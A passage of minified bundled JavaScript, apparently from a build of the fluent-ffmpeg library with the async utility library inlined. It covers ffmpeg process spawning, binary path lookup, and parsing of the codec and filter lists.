              Array.isArray(c) || (c = [c]),
              this._currentOutput.options(
                c.reduce(function (f, t) {
                  var r = String(t).split(" ");
                  return (
                    h && r.length === 2 ? f.push(r[0], r[1]) : f.push(t), f
                  );
                }, [])
              ),
              this
            );
          }),
        (i.filterGraph = i.complexFilter =
          function (c, h) {
            if (
              (this._complexFilters.clear(),
                Array.isArray(c) || (c = [c]),
                this._complexFilters(
                  "-filter_complex",
                  a.makeFilterStrings(c).join(";")
                ),
                Array.isArray(h))
            ) {
              var f = this;
              h.forEach(function (t) {
                f._complexFilters("-map", t.replace(a.streamRegexp, "[$1]"));
              });
            } else
              typeof h == "string" &&
                this._complexFilters("-map", h.replace(a.streamRegexp, "[$1]"));
            return this;
          });
    }),
    ho
  );
}
function kd(a) {
  throw new Error(
    'Could not dynamically require "' +
    a +
    '". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.'
  );
}
var po, hl;
function qd() {
  if (hl) return po;
  hl = 1;
  var a = ye;
  return (
    (po = function (i) {
      i.usingPreset = i.preset = function (c) {
        if (typeof c == "function") c(this);
        else
          try {
            var h = a.join(this.options.presets, c),
              f = kd(h);
            if (typeof f.load == "function") f.load(this);
            else throw new Error("preset " + h + " has no load() function");
          } catch (t) {
            throw new Error(
              "preset " + h + " could not be loaded: " + t.message
            );
          }
        return this;
      };
    }),
    po
  );
}
var mo = { exports: {} },
  pl;
function Bo() {
  return (
    pl ||
    ((pl = 1),
      (function (a) {
        (function () {
          var i = {},
            c,
            h;
          (c = this),
            c != null && (h = c.async),
            (i.noConflict = function () {
              return (c.async = h), i;
            });
          function f(v) {
            var w = !1;
            return function () {
              if (w) throw new Error("Callback was already called.");
              (w = !0), v.apply(c, arguments);
            };
          }
          var t = function (v, w) {
            if (v.forEach) return v.forEach(w);
            for (var _ = 0; _ < v.length; _ += 1) w(v[_], _, v);
          },
            r = function (v, w) {
              if (v.map) return v.map(w);
              var _ = [];
              return (
                t(v, function (g, D, O) {
                  _.push(w(g, D, O));
                }),
                _
              );
            },
            l = function (v, w, _) {
              return v.reduce
                ? v.reduce(w, _)
                : (t(v, function (g, D, O) {
                  _ = w(_, g, D, O);
                }),
                  _);
            },
            e = function (v) {
              if (Object.keys) return Object.keys(v);
              var w = [];
              for (var _ in v) v.hasOwnProperty(_) && w.push(_);
              return w;
            };
          typeof process > "u" || !process.nextTick
            ? typeof setImmediate == "function"
              ? ((i.nextTick = function (v) {
                setImmediate(v);
              }),
                (i.setImmediate = i.nextTick))
              : ((i.nextTick = function (v) {
                setTimeout(v, 0);
              }),
                (i.setImmediate = i.nextTick))
            : ((i.nextTick = process.nextTick),
              typeof setImmediate < "u"
                ? (i.setImmediate = function (v) {
                  setImmediate(v);
                })
                : (i.setImmediate = i.nextTick)),
            (i.each = function (v, w, _) {
              if (((_ = _ || function () { }), !v.length)) return _();
              var g = 0;
              t(v, function (D) {
                w(
                  D,
                  f(function (O) {
                    O
                      ? (_(O), (_ = function () { }))
                      : ((g += 1), g >= v.length && _(null));
                  })
                );
              });
            }),
            (i.forEach = i.each),
            (i.eachSeries = function (v, w, _) {
              if (((_ = _ || function () { }), !v.length)) return _();
              var g = 0,
                D = function () {
                  w(v[g], function (O) {
                    O
                      ? (_(O), (_ = function () { }))
                      : ((g += 1), g >= v.length ? _(null) : D());
                  });
                };
              D();
            }),
            (i.forEachSeries = i.eachSeries),
            (i.eachLimit = function (v, w, _, g) {
              var D = o(w);
              D.apply(null, [v, _, g]);
            }),
            (i.forEachLimit = i.eachLimit);
          var o = function (v) {
            return function (w, _, g) {
              if (((g = g || function () { }), !w.length || v <= 0))
                return g();
              var D = 0,
                O = 0,
                N = 0;
              (function L() {
                if (D >= w.length) return g();
                for (; N < v && O < w.length;)
                  (O += 1),
                    (N += 1),
                    _(w[O - 1], function (F) {
                      F
                        ? (g(F), (g = function () { }))
                        : ((D += 1), (N -= 1), D >= w.length ? g() : L());
                    });
              })();
            };
          },
            n = function (v) {
              return function () {
                var w = Array.prototype.slice.call(arguments);
                return v.apply(null, [i.each].concat(w));
              };
            },
            s = function (v, w) {
              return function () {
                var _ = Array.prototype.slice.call(arguments);
                return w.apply(null, [o(v)].concat(_));
              };
            },
            u = function (v) {
              return function () {
                var w = Array.prototype.slice.call(arguments);
                return v.apply(null, [i.eachSeries].concat(w));
              };
            },
            m = function (v, w, _, g) {
              var D = [];
              (w = r(w, function (O, N) {
                return { index: N, value: O };
              })),
                v(
                  w,
                  function (O, N) {
                    _(O.value, function (L, F) {
                      (D[O.index] = F), N(L);
                    });
                  },
                  function (O) {
                    g(O, D);
                  }
                );
            };
          (i.map = n(m)),
            (i.mapSeries = u(m)),
            (i.mapLimit = function (v, w, _, g) {
              return E(w)(v, _, g);
            });
          var E = function (v) {
            return s(v, m);
          };
          (i.reduce = function (v, w, _, g) {
            i.eachSeries(
              v,
              function (D, O) {
                _(w, D, function (N, L) {
                  (w = L), O(N);
                });
              },
              function (D) {
                g(D, w);
              }
            );
          }),
            (i.inject = i.reduce),
            (i.foldl = i.reduce),
            (i.reduceRight = function (v, w, _, g) {
              var D = r(v, function (O) {
                return O;
              }).reverse();
              i.reduce(D, w, _, g);
            }),
            (i.foldr = i.reduceRight);
          var y = function (v, w, _, g) {
            var D = [];
            (w = r(w, function (O, N) {
              return { index: N, value: O };
            })),
              v(
                w,
                function (O, N) {
                  _(O.value, function (L) {
                    L && D.push(O), N();
                  });
                },
                function (O) {
                  g(
                    r(
                      D.sort(function (N, L) {
                        return N.index - L.index;
                      }),
                      function (N) {
                        return N.value;
                      }
                    )
                  );
                }
              );
          };
          (i.filter = n(y)),
            (i.filterSeries = u(y)),
            (i.select = i.filter),
            (i.selectSeries = i.filterSeries);
          var p = function (v, w, _, g) {
            var D = [];
            (w = r(w, function (O, N) {
              return { index: N, value: O };
            })),
              v(
                w,
                function (O, N) {
                  _(O.value, function (L) {
                    L || D.push(O), N();
                  });
                },
                function (O) {
                  g(
                    r(
                      D.sort(function (N, L) {
                        return N.index - L.index;
                      }),
                      function (N) {
                        return N.value;
                      }
                    )
                  );
                }
              );
          };
          (i.reject = n(p)), (i.rejectSeries = u(p));
          var A = function (v, w, _, g) {
            v(
              w,
              function (D, O) {
                _(D, function (N) {
                  N ? (g(D), (g = function () { })) : O();
                });
              },
              function (D) {
                g();
              }
            );
          };
          (i.detect = n(A)),
            (i.detectSeries = u(A)),
            (i.some = function (v, w, _) {
              i.each(
                v,
                function (g, D) {
                  w(g, function (O) {
                    O && (_(!0), (_ = function () { })), D();
                  });
                },
                function (g) {
                  _(!1);
                }
              );
            }),
            (i.any = i.some),
            (i.every = function (v, w, _) {
              i.each(
                v,
                function (g, D) {
                  w(g, function (O) {
                    O || (_(!1), (_ = function () { })), D();
                  });
                },
                function (g) {
                  _(!0);
                }
              );
            }),
            (i.all = i.every),
            (i.sortBy = function (v, w, _) {
              i.map(
                v,
                function (g, D) {
                  w(g, function (O, N) {
                    O ? D(O) : D(null, { value: g, criteria: N });
                  });
                },
                function (g, D) {
                  if (g) return _(g);
                  var O = function (N, L) {
                    var F = N.criteria,
                      $ = L.criteria;
                    return F < $ ? -1 : F > $ ? 1 : 0;
                  };
                  _(
                    null,
                    r(D.sort(O), function (N) {
                      return N.value;
                    })
                  );
                }
              );
            }),
            (i.auto = function (v, w) {
              w = w || function () { };
              var _ = e(v);
              if (!_.length) return w(null);
              var g = {},
                D = [],
                O = function (F) {
                  D.unshift(F);
                },
                N = function (F) {
                  for (var $ = 0; $ < D.length; $ += 1)
                    if (D[$] === F) {
                      D.splice($, 1);
                      return;
                    }
                },
                L = function () {
                  t(D.slice(0), function (F) {
                    F();
                  });
                };
              O(function () {
                e(g).length === _.length && (w(null, g), (w = function () { }));
              }),
                t(_, function (F) {
                  var $ = v[F] instanceof Function ? [v[F]] : v[F],
                    k = function (ne) {
                      var se = Array.prototype.slice.call(arguments, 1);
                      if ((se.length <= 1 && (se = se[0]), ne)) {
                        var ce = {};
                        t(e(g), function (ie) {
                          ce[ie] = g[ie];
                        }),
                          (ce[F] = se),
                          w(ne, ce),
                          (w = function () { });
                      } else (g[F] = se), i.setImmediate(L);
                    },
                    M = $.slice(0, Math.abs($.length - 1)) || [],
                    K = function () {
                      return (
                        l(
                          M,
                          function (ne, se) {
                            return ne && g.hasOwnProperty(se);
                          },
                          !0
                        ) && !g.hasOwnProperty(F)
                      );
                    };
                  if (K()) $[$.length - 1](k, g);
                  else {
                    var G = function () {
                      K() && (N(G), $[$.length - 1](k, g));
                    };
                    O(G);
                  }
                });
            }),
            (i.waterfall = function (v, w) {
              if (((w = w || function () { }), v.constructor !== Array)) {
                var _ = new Error(
                  "First argument to waterfall must be an array of functions"
                );
                return w(_);
              }
              if (!v.length) return w();
              var g = function (D) {
                return function (O) {
                  if (O) w.apply(null, arguments), (w = function () { });
                  else {
                    var N = Array.prototype.slice.call(arguments, 1),
                      L = D.next();
                    L ? N.push(g(L)) : N.push(w),
                      i.setImmediate(function () {
                        D.apply(null, N);
                      });
                  }
                };
              };
              g(i.iterator(v))();
            });
          var S = function (v, w, _) {
            if (((_ = _ || function () { }), w.constructor === Array))
              v.map(
                w,
                function (D, O) {
                  D &&
                    D(function (N) {
                      var L = Array.prototype.slice.call(arguments, 1);
                      L.length <= 1 && (L = L[0]), O.call(null, N, L);
                    });
                },
                _
              );
            else {
              var g = {};
              v.each(
                e(w),
                function (D, O) {
                  w[D](function (N) {
                    var L = Array.prototype.slice.call(arguments, 1);
                    L.length <= 1 && (L = L[0]), (g[D] = L), O(N);
                  });
                },
                function (D) {
                  _(D, g);
                }
              );
            }
          };
          (i.parallel = function (v, w) {
            S({ map: i.map, each: i.each }, v, w);
          }),
            (i.parallelLimit = function (v, w, _) {
              S({ map: E(w), each: o(w) }, v, _);
            }),
            (i.series = function (v, w) {
              if (((w = w || function () { }), v.constructor === Array))
                i.mapSeries(
                  v,
                  function (g, D) {
                    g &&
                      g(function (O) {
                        var N = Array.prototype.slice.call(arguments, 1);
                        N.length <= 1 && (N = N[0]), D.call(null, O, N);
                      });
                  },
                  w
                );
              else {
                var _ = {};
                i.eachSeries(
                  e(v),
                  function (g, D) {
                    v[g](function (O) {
                      var N = Array.prototype.slice.call(arguments, 1);
                      N.length <= 1 && (N = N[0]), (_[g] = N), D(O);
                    });
                  },
                  function (g) {
                    w(g, _);
                  }
                );
              }
            }),
            (i.iterator = function (v) {
              var w = function (_) {
                var g = function () {
                  return v.length && v[_].apply(null, arguments), g.next();
                };
                return (
                  (g.next = function () {
                    return _ < v.length - 1 ? w(_ + 1) : null;
                  }),
                  g
                );
              };
              return w(0);
            }),
            (i.apply = function (v) {
              var w = Array.prototype.slice.call(arguments, 1);
              return function () {
                return v.apply(
                  null,
                  w.concat(Array.prototype.slice.call(arguments))
                );
              };
            });
          var b = function (v, w, _, g) {
            var D = [];
            v(
              w,
              function (O, N) {
                _(O, function (L, F) {
                  (D = D.concat(F || [])), N(L);
                });
              },
              function (O) {
                g(O, D);
              }
            );
          };
          (i.concat = n(b)),
            (i.concatSeries = u(b)),
            (i.whilst = function (v, w, _) {
              v()
                ? w(function (g) {
                  if (g) return _(g);
                  i.whilst(v, w, _);
                })
                : _();
            }),
            (i.doWhilst = function (v, w, _) {
              v(function (g) {
                if (g) return _(g);
                w() ? i.doWhilst(v, w, _) : _();
              });
            }),
            (i.until = function (v, w, _) {
              v()
                ? _()
                : w(function (g) {
                  if (g) return _(g);
                  i.until(v, w, _);
                });
            }),
            (i.doUntil = function (v, w, _) {
              v(function (g) {
                if (g) return _(g);
                w() ? _() : i.doUntil(v, w, _);
              });
            }),
            (i.queue = function (v, w) {
              w === void 0 && (w = 1);
              function _(O, N, L, F) {
                N.constructor !== Array && (N = [N]),
                  t(N, function ($) {
                    var k = {
                      data: $,
                      callback: typeof F == "function" ? F : null,
                    };
                    L ? O.tasks.unshift(k) : O.tasks.push(k),
                      O.saturated && O.tasks.length === w && O.saturated(),
                      i.setImmediate(O.process);
                  });
              }
              var g = 0,
                D = {
                  tasks: [],
                  concurrency: w,
                  saturated: null,
                  empty: null,
                  drain: null,
                  push: function (O, N) {
                    _(D, O, !1, N);
                  },
                  unshift: function (O, N) {
                    _(D, O, !0, N);
                  },
                  process: function () {
                    if (g < D.concurrency && D.tasks.length) {
                      var O = D.tasks.shift();
                      D.empty && D.tasks.length === 0 && D.empty(), (g += 1);
                      var N = function () {
                        (g -= 1),
                          O.callback && O.callback.apply(O, arguments),
                          D.drain && D.tasks.length + g === 0 && D.drain(),
                          D.process();
                      },
                        L = f(N);
                      v(O.data, L);
                    }
                  },
                  length: function () {
                    return D.tasks.length;
                  },
                  running: function () {
                    return g;
                  },
                };
              return D;
            }),
            (i.cargo = function (v, w) {
              var _ = !1,
                g = [],
                D = {
                  tasks: g,
                  payload: w,
                  saturated: null,
                  empty: null,
                  drain: null,
                  push: function (O, N) {
                    O.constructor !== Array && (O = [O]),
                      t(O, function (L) {
                        g.push({
                          data: L,
                          callback: typeof N == "function" ? N : null,
                        }),
                          D.saturated && g.length === w && D.saturated();
                      }),
                      i.setImmediate(D.process);
                  },
                  process: function O() {
                    if (!_) {
                      if (g.length === 0) {
                        D.drain && D.drain();
                        return;
                      }
                      var N =
                        typeof w == "number" ? g.splice(0, w) : g.splice(0),
                        L = r(N, function (F) {
                          return F.data;
                        });
                      D.empty && D.empty(),
                        (_ = !0),
                        v(L, function () {
                          _ = !1;
                          var F = arguments;
                          t(N, function ($) {
                            $.callback && $.callback.apply(null, F);
                          }),
                            O();
                        });
                    }
                  },
                  length: function () {
                    return g.length;
                  },
                  running: function () {
                    return _;
                  },
                };
              return D;
            });
          var R = function (v) {
            return function (w) {
              var _ = Array.prototype.slice.call(arguments, 1);
              w.apply(
                null,
                _.concat([
                  function (g) {
                    var D = Array.prototype.slice.call(arguments, 1);
                    typeof console < "u" &&
                      (g
                        ? console.error && console.error(g)
                        : console[v] &&
                        t(D, function (O) {
                          console[v](O);
                        }));
                  },
                ])
              );
            };
          };
          (i.log = R("log")),
            (i.dir = R("dir")),
            (i.memoize = function (v, w) {
              var _ = {},
                g = {};
              w =
                w ||
                function (O) {
                  return O;
                };
              var D = function () {
                var O = Array.prototype.slice.call(arguments),
                  N = O.pop(),
                  L = w.apply(null, O);
                L in _
                  ? N.apply(null, _[L])
                  : L in g
                    ? g[L].push(N)
                    : ((g[L] = [N]),
                      v.apply(
                        null,
                        O.concat([
                          function () {
                            _[L] = arguments;
                            var F = g[L];
                            delete g[L];
                            for (var $ = 0, k = F.length; $ < k; $++)
                              F[$].apply(null, arguments);
                          },
                        ])
                      ));
              };
              return (D.memo = _), (D.unmemoized = v), D;
            }),
            (i.unmemoize = function (v) {
              return function () {
                return (v.unmemoized || v).apply(null, arguments);
              };
            }),
            (i.times = function (v, w, _) {
              for (var g = [], D = 0; D < v; D++) g.push(D);
              return i.map(g, w, _);
            }),
            (i.timesSeries = function (v, w, _) {
              for (var g = [], D = 0; D < v; D++) g.push(D);
              return i.mapSeries(g, w, _);
            }),
            (i.compose = function () {
              var v = Array.prototype.reverse.call(arguments);
              return function () {
                var w = this,
                  _ = Array.prototype.slice.call(arguments),
                  g = _.pop();
                i.reduce(
                  v,
                  _,
                  function (D, O, N) {
                    O.apply(
                      w,
                      D.concat([
                        function () {
                          var L = arguments[0],
                            F = Array.prototype.slice.call(arguments, 1);
                          N(L, F);
                        },
                      ])
                    );
                  },
                  function (D, O) {
                    g.apply(w, [D].concat(O));
                  }
                );
              };
            });
          var C = function (v, w) {
            var _ = function () {
              var D = this,
                O = Array.prototype.slice.call(arguments),
                N = O.pop();
              return v(
                w,
                function (L, F) {
                  L.apply(D, O.concat([F]));
                },
                N
              );
            };
            if (arguments.length > 2) {
              var g = Array.prototype.slice.call(arguments, 2);
              return _.apply(this, g);
            } else return _;
          };
          (i.applyEach = n(C)),
            (i.applyEachSeries = u(C)),
            (i.forever = function (v, w) {
              function _(g) {
                if (g) {
                  if (w) return w(g);
                  throw g;
                }
                v(_);
              }
              _();
            }),
            a.exports ? (a.exports = i) : (c.async = i);
        })();
      })(mo)),
    mo.exports
  );
}
var go, ml;
function Md() {
  if (ml) return go;
  ml = 1;
  var a = Nt.spawn,
    i = Bo(),
    c = pt();
  function h(f) {
    f._inputs[0].isStream ||
      f.ffprobe(0, function (r, l) {
        f._ffprobeData = l;
      });
  }
  return (
    (go = function (f) {
      (f._spawnFfmpeg = function (t, r, l, e) {
        typeof r == "function" && ((e = l), (l = r), (r = {})),
          typeof e > "u" && ((e = l), (l = function () { }));
        var o = "stdoutLines" in r ? r.stdoutLines : this.options.stdoutLines;
        this._getFfmpegPath(function (n, s) {
          if (n) return e(n);
          if (!s || s.length === 0) return e(new Error("Cannot find ffmpeg"));
          r.niceness &&
            r.niceness !== 0 &&
            !c.isWindows &&
            (t.unshift("-n", r.niceness, s), (s = "nice"));
          var u = c.linesRing(o),
            m = !1,
            E = c.linesRing(o),
            y = !1,
            p = a(s, t, r);
          p.stderr && p.stderr.setEncoding("utf8"),
            p.on("error", function (R) {
              e(R);
            });
          var A = null;
          function S(R) {
            R && (A = R), b && (m || !r.captureStdout) && y && e(A, u, E);
          }
          var b = !1;
          p.on("exit", function (R, C) {
            (b = !0),
              C
                ? S(new Error("ffmpeg was killed with signal " + C))
                : R
                  ? S(new Error("ffmpeg exited with code " + R))
                  : S();
          }),
            r.captureStdout &&
            (p.stdout.on("data", function (R) {
              u.append(R);
            }),
              p.stdout.on("close", function () {
                u.close(), (m = !0), S();
              })),
            p.stderr.on("data", function (R) {
              E.append(R);
            }),
            p.stderr.on("close", function () {
              E.close(), (y = !0), S();
            }),
            l(p, u, E);
        });
      }),
        (f._getArguments = function () {
          var t = this._complexFilters.get(),
            r = this._outputs.some(function (l) {
              return l.isFile;
            });
          return [].concat(
            this._inputs.reduce(function (l, e) {
              var o = typeof e.source == "string" ? e.source : "pipe:0";
              return l.concat(e.options.get(), ["-i", o]);
            }, []),
            this._global.get(),
            r ? ["-y"] : [],
            t,
            this._outputs.reduce(function (l, e) {
              var o = c.makeFilterStrings(e.sizeFilters.get()),
                n = e.audioFilters.get(),
                s = e.videoFilters.get().concat(o),
                u;
              return (
                e.target
                  ? typeof e.target == "string"
                    ? (u = [e.target])
                    : (u = ["pipe:1"])
                  : (u = []),
                l.concat(
                  e.audio.get(),
                  n.length ? ["-filter:a", n.join(",")] : [],
                  e.video.get(),
                  s.length ? ["-filter:v", s.join(",")] : [],
                  e.options.get(),
                  u
                )
              );
            }, [])
          );
        }),
        (f._prepare = function (t, r) {
          var l = this;
          i.waterfall(
            [
              function (e) {
                l._checkCapabilities(e);
              },
              function (e) {
                if (!r) return e();
                l.ffprobe(0, function (o, n) {
                  o || (l._ffprobeData = n), e();
                });
              },
              function (e) {
                var o = l._outputs.some(function (n) {
                  return (
                    n.flags.flvmeta &&
                    !n.isFile &&
                    (l.logger.warn(
                      "Updating flv metadata is only supported for files"
                    ),
                      (n.flags.flvmeta = !1)),
                    n.flags.flvmeta
                  );
                });
                o
                  ? l._getFlvtoolPath(function (n) {
                    e(n);
                  })
                  : e();
              },
              function (e) {
                var o;
                try {
                  o = l._getArguments();
                } catch (n) {
                  return e(n);
                }
                e(null, o);
              },
              function (e, o) {
                l.availableEncoders(function (n, s) {
                  for (var u = 0; u < e.length; u++)
                    (e[u] === "-acodec" || e[u] === "-vcodec") &&
                      (u++,
                        e[u] in s &&
                        s[e[u]].experimental &&
                        (e.splice(u + 1, 0, "-strict", "experimental"),
                          (u += 2)));
                  o(null, e);
                });
              },
            ],
            t
          ),
            r ||
            (this.listeners("progress").length > 0
              ? h(this)
              : this.once("newListener", function (e) {
                e === "progress" && h(this);
              }));
        }),
        (f.exec =
          f.execute =
          f.run =
          function () {
            var t = this,
              r = this._outputs.some(function (s) {
                return "target" in s;
              });
            if (!r) throw new Error("No output specified");
            var l = this._outputs.filter(function (s) {
              return typeof s.target != "string";
            })[0],
              e = this._inputs.filter(function (s) {
                return typeof s.source != "string";
              })[0],
              o = !1;
            function n(s, u, m) {
              o ||
                ((o = !0),
                  s ? t.emit("error", s, u, m) : t.emit("end", u, m));
            }
            return (
              t._prepare(function (s, u) {
                if (s) return n(s);
                t._spawnFfmpeg(
                  u,
                  {
                    captureStdout: !l,
                    niceness: t.options.niceness,
                    cwd: t.options.cwd,
                    windowsHide: !0,
                  },
                  function (E, y, p) {
                    if (
                      ((t.ffmpegProc = E),
                        t.emit("start", "ffmpeg " + u.join(" ")),
                        e &&
                        (e.source.on("error", function (b) {
                          var R = new Error(
                            "Input stream error: " + b.message
                          );
                          (R.inputStreamError = b), n(R), E.kill();
                        }),
                          e.source.resume(),
                          e.source.pipe(E.stdin),
                          E.stdin.on("error", function () { })),
                        t.options.timeout &&
                        (t.processTimer = setTimeout(function () {
                          var b =
                            "process ran into a timeout (" +
                            t.options.timeout +
                            "s)";
                          n(new Error(b), y.get(), p.get()), E.kill();
                        }, t.options.timeout * 1e3)),
                        l &&
                        (E.stdout.pipe(l.target, l.pipeopts),
                          l.target.on("close", function () {
                            t.logger.debug(
                              "Output stream closed, scheduling kill for ffmpeg process"
                            ),
                              setTimeout(function () {
                                n(new Error("Output stream closed")), E.kill();
                              }, 20);
                          }),
                          l.target.on("error", function (b) {
                            t.logger.debug(
                              "Output stream error, killing ffmpeg process"
                            );
                            var R = new Error(
                              "Output stream error: " + b.message
                            );
                            (R.outputStreamError = b),
                              n(R, y.get(), p.get()),
                              E.kill("SIGKILL");
                          })),
                        p)
                    ) {
                      if (
                        (t.listeners("stderr").length &&
                          p.callback(function (b) {
                            t.emit("stderr", b);
                          }),
                          t.listeners("codecData").length)
                      ) {
                        var A = !1,
                          S = {};
                        p.callback(function (b) {
                          A || (A = c.extractCodecData(t, b, S));
                        });
                      }
                      t.listeners("progress").length &&
                        p.callback(function (b) {
                          c.extractProgress(t, b);
                        });
                    }
                  },
                  function (E, y, p) {
                    if (
                      (clearTimeout(t.processTimer), delete t.ffmpegProc, E)
                    )
                      E.message.match(/ffmpeg exited with code/) &&
                        (E.message += ": " + c.extractError(p.get())),
                        n(E, y.get(), p.get());
                    else {
                      var A = t._outputs.filter(function (S) {
                        return S.flags.flvmeta;
                      });
                      A.length
                        ? t._getFlvtoolPath(function (S, b) {
                          if (S) return n(S);
                          i.each(
                            A,
                            function (R, C) {
                              a(b, ["-U", R.target], { windowsHide: !0 })
                                .on("error", function (v) {
                                  C(
                                    new Error(
                                      "Error running " +
                                      b +
                                      " on " +
                                      R.target +
                                      ": " +
                                      v.message
                                    )
                                  );
                                })
                                .on("exit", function (v, w) {
                                  v !== 0 || w
                                    ? C(
                                      new Error(
                                        b +
                                        " " +
                                        (w
                                          ? "received signal " + w
                                          : "exited with code " + v)
                                      ) +
                                      " when running on " +
                                      R.target
                                    )
                                    : C();
                                });
                            },
                            function (R) {
                              R ? n(R) : n(null, y.get(), p.get());
                            }
                          );
                        })
                        : n(null, y.get(), p.get());
                    }
                  }
                );
              }),
              this
            );
          }),
        (f.renice = function (t) {
          if (
            !c.isWindows &&
            ((t = t || 0),
              (t < -20 || t > 20) &&
              this.logger.warn(
                "Invalid niceness value: " + t + ", must be between -20 and 20"
              ),
              (t = Math.min(20, Math.max(-20, t))),
              (this.options.niceness = t),
              this.ffmpegProc)
          ) {
            var r = this.logger,
              l = this.ffmpegProc.pid,
              e = a("renice", [t, "-p", l], { windowsHide: !0 });
            e.on("error", function (o) {
              r.warn("could not renice process " + l + ": " + o.message);
            }),
              e.on("exit", function (o, n) {
                n
                  ? r.warn(
                    "could not renice process " +
                    l +
                    ": renice was killed by signal " +
                    n
                  )
                  : o
                    ? r.warn(
                      "could not renice process " +
                      l +
                      ": renice exited with " +
                      o
                    )
                    : r.info(
                      "successfully reniced process " +
                      l +
                      " to " +
                      t +
                      " niceness"
                    );
              });
          }
          return this;
        }),
        (f.kill = function (t) {
          return (
            this.ffmpegProc
              ? this.ffmpegProc.kill(t || "SIGKILL")
              : this.logger.warn(
                "No running ffmpeg process, cannot send signal"
              ),
            this
          );
        });
    }),
    go
  );
}
var vo, gl;
function Bd() {
  if (gl) return vo;
  gl = 1;
  var a = be,
    i = ye,
    c = Bo(),
    h = pt(),
    f = /^\s*([D ])([E ])([VAS])([S ])([D ])([T ]) ([^ ]+) +(.*)$/,
    t = /^\s*([D\.])([E\.])([VAS])([I\.])([L\.])([S\.]) ([^ ]+) +(.*)$/,
    r = /\(encoders:([^\)]+)\)/,
    l = /\(decoders:([^\)]+)\)/,
    e = /^\s*([VAS\.])([F\.])([S\.])([X\.])([B\.])([D\.]) ([^ ]+) +(.*)$/,
    o = /^\s*([D ])([E ])\s+([^ ]+)\s+(.*)$/,
    n = /\r\n|\r|\n/,
    s = /^(?: [T\.][S\.][C\.] )?([^ ]+) +(AA?|VV?|\|)->(AA?|VV?|\|) +(.*)$/,
    u = {};
  return (
    (vo = function (m) {
      (m.setFfmpegPath = function (E) {
        return (u.ffmpegPath = E), this;
      }),
        (m.setFfprobePath = function (E) {
          return (u.ffprobePath = E), this;
        }),
        (m.setFlvtoolPath = function (E) {
          return (u.flvtoolPath = E), this;
        }),
        (m._forgetPaths = function () {
          delete u.ffmpegPath, delete u.ffprobePath, delete u.flvtoolPath;
        }),
        (m._getFfmpegPath = function (E) {
          if ("ffmpegPath" in u) return E(null, u.ffmpegPath);
          c.waterfall(
            [
              function (y) {
                process.env.FFMPEG_PATH
                  ? a.exists(process.env.FFMPEG_PATH, function (p) {
                    p ? y(null, process.env.FFMPEG_PATH) : y(null, "");
                  })
                  : y(null, "");
              },
              function (y, p) {
                if (y.length) return p(null, y);
                h.which("ffmpeg", function (A, S) {
                  p(A, S);
                });
              },
            ],
            function (y, p) {
              y ? E(y) : E(null, (u.ffmpegPath = p || ""));
            }
          );
        }),
        (m._getFfprobePath = function (E) {
          var y = this;
          if ("ffprobePath" in u) return E(null, u.ffprobePath);
          c.waterfall(
            [
              function (p) {
                process.env.FFPROBE_PATH
                  ? a.exists(process.env.FFPROBE_PATH, function (A) {
                    p(null, A ? process.env.FFPROBE_PATH : "");
                  })
                  : p(null, "");
              },
              function (p, A) {
                if (p.length) return A(null, p);
                h.which("ffprobe", function (S, b) {
                  A(S, b);
                });
              },
              function (p, A) {
                if (p.length) return A(null, p);
                y._getFfmpegPath(function (S, b) {
                  if (S) A(S);
                  else if (b.length) {
                    var R = h.isWindows ? "ffprobe.exe" : "ffprobe",
                      C = i.join(i.dirname(b), R);
                    a.exists(C, function (v) {
                      A(null, v ? C : "");
                    });
                  } else A(null, "");
                });
              },
            ],
            function (p, A) {
              p ? E(p) : E(null, (u.ffprobePath = A || ""));
            }
          );
        }),
        (m._getFlvtoolPath = function (E) {
          if ("flvtoolPath" in u) return E(null, u.flvtoolPath);
          c.waterfall(
            [
              function (y) {
                process.env.FLVMETA_PATH
                  ? a.exists(process.env.FLVMETA_PATH, function (p) {
                    y(null, p ? process.env.FLVMETA_PATH : "");
                  })
                  : y(null, "");
              },
              function (y, p) {
                if (y.length) return p(null, y);
                process.env.FLVTOOL2_PATH
                  ? a.exists(process.env.FLVTOOL2_PATH, function (A) {
                    p(null, A ? process.env.FLVTOOL2_PATH : "");
                  })
                  : p(null, "");
              },
              function (y, p) {
                if (y.length) return p(null, y);
                h.which("flvmeta", function (A, S) {
                  p(A, S);
                });
              },
              function (y, p) {
                if (y.length) return p(null, y);
                h.which("flvtool2", function (A, S) {
                  p(A, S);
                });
              },
            ],
            function (y, p) {
              y ? E(y) : E(null, (u.flvtoolPath = p || ""));
            }
          );
        }),
        (m.availableFilters = m.getAvailableFilters =
          function (E) {
            if ("filters" in u) return E(null, u.filters);
            this._spawnFfmpeg(
              ["-filters"],
              { captureStdout: !0, stdoutLines: 0 },
              function (y, p) {
                if (y) return E(y);
                var A = p.get(),
                  S = A.split(`
`),
                  b = {},
                  R = { A: "audio", V: "video", "|": "none" };
                S.forEach(function (C) {
                  var v = C.match(s);
                  v &&
                    (b[v[1]] = {
                      description: v[4],
                      input: R[v[2].charAt(0)],
                      multipleInputs: v[2].length > 1,
                      output: R[v[3].charAt(0)],
                      multipleOutputs: v[3].length > 1,
                    });
                }),
                  E(null, (u.filters = b));
              }
            );
          }),
        (m.availableCodecs = m.getAvailableCodecs =
          function (E) {
            if ("codecs" in u) return E(null, u.codecs);
            this._spawnFfmpeg(
              ["-codecs"],
              { captureStdout: !0, stdoutLines: 0 },
              function (y, p) {
                if (y) return E(y);
                var A = p.get(),
                  S = A.split(n),
                  b = {};
                S.forEach(function (R) {
                  var C = R.match(f);
                  if (
                    (C &&
                      C[7] !== "=" &&
                      (b[C[7]] = {
                        type: { V: "video", A: "audio", S: "subtitle" }[C[3]],
                        description: C[8],
                        canDecode: C[1] === "D",
                        canEncode: C[2] === "E",
                        drawHorizBand: C[4] === "S",
                        directRendering: C[5] === "D",
                        weirdFrameTruncation: C[6] === "T",
                      }),
                      (C = R.match(t)),
                      C && C[7] !== "=")
                  ) {
                    var v = (b[C[7]] = {
                      type: { V: "video", A: "audio", S: "subtitle" }[C[3]],
                      description: C[8],
                      canDecode: C[1] === "D",
                      canEncode: C[2] === "E",
                      intraFrameOnly: C[4] === "I",
                      isLossy: C[5] === "L",
                      isLossless: C[6] === "S",
                    }),
                      w = v.description.match(r);
                    w = w ? w[1].trim().split(" ") : [];
                    var _ = v.description.match(l);
                    if (
                      ((_ = _ ? _[1].trim().split(" ") : []),
                        w.length || _.length)
                    ) {
                      var g = {};
                      h.copy(v, g),
                        delete g.canEncode,
                        delete g.canDecode,
                        w.forEach(function (D) {
                          (b[D] = {}), h.copy(g, b[D]), (b[D].canEncode = !0);
                        }),
